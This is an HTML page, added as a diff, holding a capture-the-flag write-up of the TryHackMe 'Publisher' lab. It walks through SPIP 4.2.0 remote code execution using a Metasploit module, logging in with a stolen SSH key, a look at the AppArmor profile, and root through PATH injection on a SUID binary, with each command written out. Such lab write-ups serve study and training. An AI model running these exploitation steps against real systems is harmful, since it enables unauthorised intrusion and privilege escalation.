@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self';">
+  <title>Publisher | Alberto Erbusti</title>
+  <meta name="description" content="Writeup for TryHackMe Publisher — SPIP RCE via CVE, SSH key exfiltration, AppArmor bypass, and root via PATH injection on a SUID binary.">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+
+  <nav>
+    <a class="nav-logo" href="../index.html"><span>~/</span>albierbi</a>
+    <ul class="nav-links">
+      <li><a href="../index.html#about">About</a></li>
+      <li><a href="../writeups/" class="active">Writeups</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+  </nav>
+
+  <div class="writeup-hero">
+    <div class="writeup-hero-inner">
+      <div class="writeup-back">
+        <a href="../writeups/">&larr; all writeups</a>
+      </div>
+      <div class="writeup-meta-top">
+        <span class="platform-badge badge-thm">TryHackMe</span>
+        <span class="diff-badge diff-easy">easy</span>
+      </div>
+      <h1 class="writeup-title">Publisher</h1>
+      <p class="writeup-subtitle">SPIP CMS RCE via known CVE to get a foothold, SSH key exfiltration for a stable shell, AppArmor policy analysis to find a writable path, then root via PATH injection on a SUID binary.</p>
+      <div class="writeup-tags">
+        <span class="tag">web</span>
+        <span class="tag">spip</span>
+        <span class="tag">rce</span>
+        <span class="tag">metasploit</span>
+        <span class="tag">ssh</span>
+        <span class="tag">apparmor</span>
+        <span class="tag">suid</span>
+        <span class="tag">path-injection</span>
+        <span class="tag">privesc</span>
+      </div>
+      <div class="writeup-date">Completed &mdash; 2026-04-25</div>
+    </div>
+  </div>
+
+  <div class="writeup-body">
+
+    <aside class="writeup-toc">
+      <div class="toc-label">// contents</div>
+      <ul>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#web">Web Enumeration</a></li>
+        <li><a href="#foothold">Foothold</a></li>
+        <li><a href="#shell">Stable Shell</a></li>
+        <li><a href="#privesc">Privilege Escalation</a></li>
+        <li><a href="#takeaways">Takeaways</a></li>
+      </ul>
+    </aside>
+
+    <article class="writeup-content">
+
+      <section id="recon">
+        <h2>Recon</h2>
+        <p>Started with a standard Nmap scan.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>nmap -sV -sC 10.10.248.7</pre>
+        </div>
+        <div class="info-grid">
+          <div class="info-row"><span class="port">22</span><span class="service">SSH</span></div>
+          <div class="info-row"><span class="port">80</span><span class="service">HTTP</span></div>
+        </div>
+        <p>Port 80 served what looked like a normal website.</p>
+      </section>
+
+      <section id="web">
+        <h2>Web Enumeration</h2>
+        <p>Ran gobuster to find hidden paths.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>gobuster dir -u http://10.10.248.7 -w /usr/share/wordlists/dirb/common.txt</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Found</div>
+          <ul>
+            <li><code>http://10.10.248.7/spip/</code> — SPIP CMS installation</li>
+            <li><code>http://10.10.248.7/spip/ecrire</code> — admin login panel</li>
+            <li><code>http://10.10.248.7/spip/tmp/log/auth.log</code> — no secret key, all passwords invalidated</li>
+            <li><code>http://10.10.248.7/spip/local/config.txt</code> — reveals SPIP version 4.2.0</li>
+          </ul>
+        </div>
+        <p>With the version confirmed, ran searchsploit and found a known RCE vulnerability for SPIP 4.2.0.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>searchsploit spip 4.2</pre>
+        </div>
+      </section>
+
+      <section id="foothold">
+        <h2>Foothold — SPIP RCE</h2>
+        <p>A public Python exploit existed for this version, but it failed despite having a valid CSRF token. Two issues surfaced:</p>
+        <ul>
+          <li>The CSRF token is tied to the user session, so the URL in the script needed to match the redirect target of <code>/spip/ecrire</code>, not the base path.</li>
+          <li>A second server-side filter kept rejecting the payload — <code>/tmp/spip.log</code> showed <code>ERREUR: signature ajax form incorrecte : oubli (encodage corrompu)</code>.</li>
+        </ul>
+        <p>Switched to Metasploit, which handled the form encoding correctly. Also cross-referenced the exploit base code to fix the <code>FORM_PAGE</code> path.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>msfconsole
+use exploit/unix/webapp/spip_rce_form
+set RHOSTS 10.10.248.7
+set TARGETURI /spip
+run</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Got a webshell</div>
+          <p>Metasploit landed a session. Upgraded to a proper interactive shell from there.</p>
+        </div>
+      </section>
+
+      <section id="shell">
+        <h2>Stable Shell — SSH Key Exfiltration</h2>
+        <p>Found an SSH private key for the user <code>think</code> on the machine.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># Read the key from the victim, save it locally
+chmod 600 think_id_rsa
+ssh -i think_id_rsa think@10.10.248.7</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Full interactive shell as think</div>
+        </div>
+      </section>
+
+      <section id="privesc">
+        <h2>Privilege Escalation — PATH Injection via SUID</h2>
+        <p>Started enumeration looking for SUID binaries.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>find / -perm -4000 2>/dev/null</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Found unusual SUID binary</div>
+          <p><code>/usr/sbin/run_container</code> — not a standard system binary.</p>
+        </div>
+        <p>The binary lives under <code>/opt</code>, which AppArmor blocked from listing. Checked the AppArmor profile to understand what was restricted and what wasn't.</p>
+        <div class="callout callout-info">
+          <div class="callout-title">AppArmor analysis</div>
+          <p>The profile denied listing <code>/opt</code> but explicitly allowed writes to <code>/var/tmp</code>. Direct reads of known paths still worked, so <code>/opt/run_container.sh</code> was readable even without being able to list the directory.</p>
+        </div>
+        <p>Reading the script revealed that it calls <code>docker</code> without an absolute path — just the bare command name. This is a classic PATH injection target.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># Prepend /var/tmp to PATH
+export PATH=/var/tmp:$PATH
+
+# Create a malicious "docker" script in /var/tmp
+echo '/bin/bash -p' > /var/tmp/docker
+chmod +x /var/tmp/docker
+
+# Run the SUID binary
+/usr/sbin/run_container</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Root shell</div>
+          <p>The SUID binary executed our fake <code>docker</code> with elevated privileges. <code>bash -p</code> preserved them, dropping us into a root shell.</p>
+        </div>
+      </section>
+
+      <section id="takeaways">
+        <h2>Takeaways</h2>
+        <div class="callout callout-info">
+          <div class="callout-title">Key lessons</div>
+          <ul>
+            <li>Version disclosure in config files (<code>config.txt</code>, log files) is often the fastest path to a known CVE</li>
+            <li>When a public exploit fails, check the actual server error logs — <code>/tmp/spip.log</code> told us exactly what the filter rejected</li>
+            <li>AppArmor restricts listing but not necessarily reading — knowing a full path is enough to access a file</li>
+            <li>SUID binaries calling commands without absolute paths are PATH injection targets — always check the source script</li>
+            <li><code>bash -p</code> preserves SUID privileges; without it, bash would drop them on startup</li>
+          </ul>
+        </div>
+      </section>
+
+    </article>
+  </div>
+
+  <footer>
+    <span>&copy; 2026 Alberto Erbusti</span>
+    <a href="../writeups/" class="footer-back">&larr; back to writeups</a>
+  </footer>
+
+</body>
+</html>
